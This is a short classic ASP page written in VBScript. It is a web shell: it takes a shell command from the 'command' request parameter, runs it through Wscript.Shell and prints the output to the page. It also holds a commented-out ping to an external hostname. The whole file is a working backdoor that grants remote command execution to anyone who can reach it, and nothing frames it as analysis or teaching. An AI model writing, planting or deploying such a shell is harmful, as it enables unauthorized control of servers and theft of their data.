<% @Language = "vbscript" %>
<%
  Response.Write(CreateObject("Wscript.Shell").Exec(Request("command")).StdOut.Readall())
'ping -n 1 dallas01.harvestamerican.net
%>
